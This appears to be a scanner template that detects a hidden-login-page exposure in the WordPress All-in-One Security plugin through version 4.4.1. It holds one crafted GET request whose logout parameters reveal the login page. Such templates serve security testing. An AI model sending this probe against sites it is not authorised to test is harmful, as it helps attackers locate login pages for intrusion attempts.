id: wp-security-hidden-login-exposure
brief:
    title: WordPress All-in-One Security <=4.4.1 - Hidden Login Page Exposure
    by: theamanrawat
    level: medium
    about: WordPress All-in-One Security plugin through 4.4.1 contains an exposure of the actual URL of the "hidden login page" feature.
    label:
        - wp-plugin
        - exposure
        - wordpress
        - wp
        - wpscan
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/?aiowpsec_do_log_out=1&al_additional_data=1'
      signs:
        - "on": word
          has:
            - Username or Email Address
            - wp_attempt_focus
          in: body
          need: all
        - "on": status
          status:
            - 200
